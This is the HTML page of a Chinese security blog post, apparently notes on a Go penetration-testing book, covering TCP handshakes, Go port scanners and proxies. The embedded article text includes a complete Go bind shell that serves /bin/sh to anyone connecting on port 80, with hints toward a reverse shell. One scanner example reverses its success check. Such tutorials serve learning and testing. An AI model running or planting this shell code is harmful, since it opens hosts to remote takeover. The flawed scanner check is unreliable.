这样可以确保标准输出被充分刷新并通过 net.Conn 发送 cmd.Stdout = NewFlusher(conn) // 运行命令 if err := cmd.Run(); err != nil { log.Fatalln(err) } } 这种解决方案虽然可行，但并不是很优雅。尽管能满足工作要求的代码要比优雅的代码更重要，但我们将以此问题为契机介绍函数 io.Pipe(),该函数是 Go 的同步内存管道，可用于连接 Reader 和 Writer 。\nfunc handler(conn net.Conn) { // 显式调用 /bin/sh 并使用 -i 进入交互模式 // 这样我们就可以用它作为标准输入和标准输出 // 对于 Windows 使用 exec.Command(\"cmd.exe\") cmd := exec.Command(\"/bin/sh\", \"-i\") // 将标准输入设置为我们的连接 rp, wp := io.Pipe() cmd.Stdin = conn cmd.Stdout = wp go io.Copy(conn, rp) cmd.Run() conn.Close() } 调用 io.Pipe() 会同时创建同步连接的一个 reader 和一个 writer ——任何被写入 writer 的数据（在本示例中为 wp )都会被 reader(rp) 读取。因此，需要将 writer 分配给 cmd.Stdout ，然后使用 io.Copy(conn,rp) 将 PipeReader 链接到 TCP 连接。可使用 goroutine 防止代码被阻塞。命令的任何标准输出都将发送到 writer ,然后通过管道传送到 reader 并通过 TCP 连接输出。\n现在我们已经从等待连接的 TCP 监听器的角度成功实现了 Netcat 强大的“安全巨洞\"功能。你可以参照本章示例试着从连接客户端将本地二进制文件的 stdout 和 stdin 重定向到远程监听器的角度来实现该功能。其具体实现留待你去挖掘，下面仅列出几点供你参考。\n通过 net.Dial(network,address string) 建立与远程监听器的连接。 通过 exec.Command(name string,arg..string) 初始化一个 Cmd。 重定向 Stdin 和 Stdout 以利用 net.Conn 对象。 运行命令。 此时，侦听器应该会收到一个连接。发送到客户端的任何数据都应在客户端上理解为 stdin ,而在侦听器上接收到的任何数据都应理解为 stdout 。\n实例完整代码：\npackage main import ( \"io\" \"log\" \"net\" \"os/exec\" ) func handler(conn net.Conn) { // 显式调用 /bin/sh 并使用 -i 进入交互模式 // 这样我们就可以用它作为标准输入和标准输出 // 对于 Windows 使用 exec.Command(\"cmd.exe\") cmd := exec.Command(\"/bin/sh\", \"-i\") // 将标准输入设置为我们的连接 rp, wp := io.Pipe() cmd.Stdin = conn cmd.Stdout = wp go io.Copy(conn, rp) cmd.Run() conn.Close() } func main() { // 在本地端口 80 上监听 listener, err := net.Listen(\"tcp\", \":80\") if err != nil { log.Fatalln(\"Unable to bind to port\") } for { conn, err := listener.Accept() if err != nil { log.Fatalln(\"Unable to accept connection\") } go handler(conn) } } ",
  "wordCount" : "9132",
  "inLanguage": "en",
  "datePublished": "2023-02-03T12:07:44+08:00",
  "dateModified": "2023-02-03T12:07:44+08:00",
  "author":[{
    "@type": "Person",
    "name": "N3bu74"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://n3bu74.github.io/posts/sec/tcp-scanner-proxy/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "N3bu74's Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://n3bu74.github.io/img/N3bu74.png"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>



<script async src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>


<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://n3bu74.github.io" accesskey="h" title="N3bu74&#39;s Blog (Alt + H)">
            <img src="https://n3bu74.github.io/img/Q.gif" alt="logo" aria-label="logo"
                 height="35">N3bu74&#39;s Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                         fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                         stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://n3bu74.github.io/search" title="🔍 搜索 (Alt &#43; /)" accesskey=/>
                <span>🔍 搜索</span>
                </a>
            </li>
            <li>
                <a href="https://n3bu74.github.io/posts" title="📚 文章">
                <span>📚 文章</span>
                </a>
            </li>
            <li>
                <a href="https://n3bu74.github.io/categories/" title="📦 分类">
                <span>📦 分类</span>
                </a>
            </li>
            <li>
                <a href="https://n3bu74.github.io/tags" title="🧩 标签">
                <span>🧩 标签</span>
                </a>
            </li>
            <li>
                <a href="https://n3bu74.github.io/archives/" title="⏱️ 时间轴">
                <span>⏱️ 时间轴</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main page">
<article class="post-single">
    <div id="single-content">
        <header class="post-header">
            <div class="breadcrumbs"><a href="https://n3bu74.github.io">主页</a>&nbsp;»&nbsp;<a href="https://n3bu74.github.io/posts/">📚文章</a>&nbsp;»&nbsp;<a href="https://n3bu74.github.io/posts/sec/">💻 安全</a></div>
            <h1 class="post-title">
                TCP、扫描器和代理
            </h1>
            <div class="post-description">
                Go黑帽子渗透测试编程之道一之TCP、扫描器和代理
            </div>
            <div class="post-meta">📅&nbsp;<span title='2023-02-03 12:07:44 +0800 CST'>2023-02-03</span>&nbsp; &nbsp;⏰&nbsp;2023-02-03&nbsp; &nbsp;📃:&nbsp;9132字&nbsp; &nbsp;⏳&nbsp;19分钟&nbsp; &nbsp;
🙍‍♂️&nbsp;N3bu74



                &nbsp; &nbsp; 🧩 &nbsp;
                <ul class="post-tags-meta">
                    <a href="https://n3bu74.github.io/tags/golang/">Golang</a>
                </ul>

                
                <span id="busuanzi_container_page_pv">
                &nbsp; 👁‍🗨 <span id="busuanzi_value_page_pv"></span>
            </span>

</div>
        </header> 
        <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">文章目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#1tcp%e6%89%ab%e6%8f%8f" aria-label="1.TCP扫描">1.TCP扫描</a><ul>
                        
                <li>
                    <a href="#10-tcp%e6%8f%a1%e6%89%8b%e6%9c%ba%e5%88%b6" aria-label="1.0 TCP握手机制">1.0 TCP握手机制</a></li>
                <li>
                    <a href="#11-%e5%8d%95%e4%b8%aa%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f" aria-label="1.1 单个端口扫描">1.1 单个端口扫描</a></li>
                <li>
                    <a href="#12-%e9%9d%9e%e5%b9%b6%e5%8f%91%e6%89%ab%e6%8f%8f" aria-label="1.2 非并发扫描">1.2 非并发扫描</a></li>
                <li>
                    <a href="#13-%e5%b9%b6%e5%8f%91%e6%89%ab%e6%8f%8f" aria-label="1.3 并发扫描">1.3 并发扫描</a><ul>
                        
                <li>
                    <a href="#131-%e4%bd%bf%e7%94%a8-waitgroup-%e8%bf%9b%e8%a1%8c%e5%90%8c%e6%ad%a5%e6%89%ab%e6%8f%8f" aria-label="1.3.1 使用 WaitGroup 进行同步扫描">1.3.1 使用 WaitGroup 进行同步扫描</a></li>
                <li>
                    <a href="#132-%e4%bd%bf%e7%94%a8%e4%ba%ba%e5%b7%a5%e6%b1%a0%e8%bf%9b%e8%a1%8c%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f" aria-label="1.3.2 使用人工池进行端口扫描">1.3.2 使用人工池进行端口扫描</a><ul>
                        
                <li>
                    <a href="#1321-%e5%8d%95%e9%80%9a%e9%81%93%e9%80%9a%e4%bf%a1" aria-label="1.3.2.1 单通道通信">1.3.2.1 单通道通信</a></li>
                <li>
                    <a href="#1322-%e5%a4%9a%e9%80%9a%e9%81%93%e9%80%9a%e4%bf%a1" aria-label="1.3.2.2 多通道通信">1.3.2.2 多通道通信</a></li></ul>
                </li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#2%e6%9e%84%e9%80%a0tcp%e4%bb%a3%e7%90%86" aria-label="2.构造TCP代理">2.构造TCP代理</a><ul>
                        
                <li>
                    <a href="#21-%e4%bd%bf%e7%94%a8-ioreader-%e5%92%8c-iowriter" aria-label="2.1 使用 io.Reader 和 io.Writer">2.1 使用 io.Reader 和 io.Writer</a></li>
                <li>
                    <a href="#22-%e5%88%9b%e5%bb%ba%e5%9b%9e%e6%98%be%e6%9c%8d%e5%8a%a1%e5%99%a8" aria-label="2.2 创建回显服务器">2.2 创建回显服务器</a></li>
                <li>
                    <a href="#23-%e9%80%9a%e8%bf%87%e5%88%9b%e5%bb%ba%e5%b8%a6%e7%bc%93%e5%86%b2%e7%9a%84%e7%9b%91%e5%90%ac%e5%99%a8%e6%9d%a5%e6%94%b9%e8%bf%9b%e4%bb%a3%e7%a0%81" aria-label="2.3 通过创建带缓冲的监听器来改进代码">2.3 通过创建带缓冲的监听器来改进代码</a></li>
                <li>
                    <a href="#24-%e4%bb%a3%e7%90%86%e4%b8%80%e4%b8%aatcp%e5%ae%a2%e6%88%b7%e7%ab%af" aria-label="2.4 代理一个TCP客户端">2.4 代理一个TCP客户端</a></li>
                <li>
                    <a href="#25-%e5%a4%8d%e7%8e%b0-netcat-%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" aria-label="2.5 复现 Netcat 命令执行">2.5 复现 Netcat 命令执行</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    window.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();

        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        
        activeElement = elements[0];
        const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
        document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
    }, false);

    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);

    window.addEventListener('scroll', () => {
        
        activeElement = Array.from(elements).find((element) => {
            if ((getOffsetTop(element) - window.pageYOffset) > 0 &&
                (getOffsetTop(element) - window.pageYOffset) < window.innerHeight/2) {
                return element;
            }
        }) || activeElement

        elements.forEach(element => {
            const id = encodeURI(element.getAttribute('id')).toLowerCase();
            if (element === activeElement){
                document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
            } else {
                document.querySelector(`.inner ul li a[href="#${id}"]`).classList.remove('active');
            }
        })
    }, false);

    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);

    function checkTocPosition() {
        const width = document.body.scrollWidth;

        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }

    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;
    }
</script>
        
        <div class="post-content"><h2 id="1tcp扫描">1.TCP扫描<a hidden class="anchor" aria-hidden="true" href="#1tcp扫描">#</a></h2>
<h3 id="10-tcp握手机制">1.0 TCP握手机制<a hidden class="anchor" aria-hidden="true" href="#10-tcp握手机制">#</a></h3>
<blockquote>
<p>TCP中最重要的一点即三次握手，所谓tcp全连接扫描，tcp半连接扫描等都是依据三次握手的基础进行的，只不过是在握手的次数上有区别。简单来说三次握手分为下面三步：</p>
<p>第一次握手：客户端发送syn包，表示通信开始</p>
<p>第二次握手：服务端回复syn-ack作为相应，提示客户端以ack结束</p>
<p>第三次握手：客户端发送ack，通信开始</p>
</blockquote>
<p><img loading="lazy" src="image-20221208214736654.png" alt="image-20221208214736654"  />
</p>
<blockquote>
<p>1.如果端口是开放的，则会进行3次握手。首先，客户端发送一个syn数据包，该数据包表示通信开始;然后，服务器以syn-ack进行响应，提示客户端以ack作为结束;之后就可以进行数据传输。</p>
<p>2.如果端口关闭，则服务器会以一个rst数据包而不是syn-ack进行响应。</p>
<p>3.如果流量被防火墙过滤，则客户端通常不会从服务器收到任何响应。</p>
</blockquote>
<h3 id="11-单个端口扫描">1.1 单个端口扫描<a hidden class="anchor" aria-hidden="true" href="#11-单个端口扫描">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">_</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#e6db74">&#34;www.baidu.com:80&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Connection successful&#34;</span>)
</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Connection failed&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><blockquote>
<p>我们所使用的是Go的net包： Dial(network string, address string) (Conn, error)。</p>
<p>第一个参数是一个字符串，用于标识要启动的连接的类型。可以是TCP、UNIX套接字、UDP和第4层协议的连接。</p>
<p>第二个参数是告诉 Dial函数 你想要连接的主机。对于 IPv4/TCP连接，此字符串将使用 host:port 的形式。</p>
<p>判断是否连接成功：Dial(network,address string）返回 Con 和 error ,如果连接成功, error 将为 nil。因此,要验证连接,只需要检查 error是否等于nil.</p>
</blockquote>
<h3 id="12-非并发扫描">1.2 非并发扫描<a hidden class="anchor" aria-hidden="true" href="#12-非并发扫描">#</a></h3>
<p>当我们要对多个端口扫描时，就要对端口进行枚举并拼接到 address中，这里就要将整数转换成字符串并拼接，或者直接格式化输出。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">address</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;127.0.0.1:%d&#34;</span>, <span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#a6e22e">address</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Connect port:%d failed\n&#34;</span>, <span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;port:%d Open\n&#34;</span>, <span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="13-并发扫描">1.3 并发扫描<a hidden class="anchor" aria-hidden="true" href="#13-并发扫描">#</a></h3>
<p>从上例扫描可知，扫描速度特慢，所以可以采取并发操作。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">j</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">address</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;127.0.0.1:%d&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#a6e22e">address</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Connect port:%d failed\n&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;port:%d Open\n&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>		}(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>但是这里如果 直接使用 go 关键字，会为每个连接启动一个 goroutine 而主 goroutine 并不知道要等待连接发生。因此，代码会在for循环完成其迭代后立即完成并退出，这可能比代码与目标端口之间的数据包网络交换还要快。对于数据包仍在运行中的端口，可能无法获得其准确的结果，因此我们得采取一些方法解决这个问题。</p>
<h4 id="131-使用-waitgroup-进行同步扫描">1.3.1 使用 WaitGroup 进行同步扫描<a hidden class="anchor" aria-hidden="true" href="#131-使用-waitgroup-进行同步扫描">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;sync&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;time&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">t</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wg</span> <span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">j</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Done</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">address</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;127.0.0.1:%d&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#a6e22e">address</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">//fmt.Printf(&#34;Connect port:%d failed\n&#34;, j)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;port:%d Open\n&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>		}(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Wait</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Since</span>(<span style="color:#a6e22e">t</span>))
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>该程序比初始版本有了进步，但仍然不算是正确的。如果对多个主机多次执行此程序，则可能会看到<strong>不一致的结果</strong>。同时扫描过多的主机或端口<strong>可能会导致网络或系统限制</strong>，造成结果不正确。你可以尝试将 1024 更改为 65535 并将目标服务器更改为本地主机 l27.0.0.1 ，结果可能会发生错误。如有需要，可以使用Wireshark或tcpdump查看打开这些连接的速度。</p>
<h4 id="132-使用人工池进行端口扫描">1.3.2 使用人工池进行端口扫描<a hidden class="anchor" aria-hidden="true" href="#132-使用人工池进行端口扫描">#</a></h4>
<h5 id="1321-单通道通信">1.3.2.1 单通道通信<a hidden class="anchor" aria-hidden="true" href="#1321-单通道通信">#</a></h5>
<p>为避免结果不一致，我们需要使用 goroutine 池管理正在进行的并发工作。使用 for 循环创建一定数量的工人 goroutine 作为资源池；然后，在 main() 线程中使用通道提供工作。</p>
<p>首先，创建一个新程序，该程序有 l00 个 worker ,使用一个 int 通道将它们打印到屏幕上。继续使用 WaitGroup 阻塞执行。</p>
<p>函数 worker(ports chan int, * sync.WaitGroup) 有两个参数：int 类型的通道和指向 WaitGroup 的指针。通道用于接收工作，而WaitGroup则用于跟踪单个工作的完成情况。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;sync&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">wg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">ports</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">p</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Done</span>()
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ports</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#ae81ff">100</span>) <span style="color:#75715e">// make 一个容量为 100 的缓冲通道
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wg</span> <span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> &lt; cap(<span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> { <span style="color:#75715e">//启动所需数量的工人线程,但这时工人尚未工作
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">wg</span>)
</span></span><span style="display:flex;"><span>	}
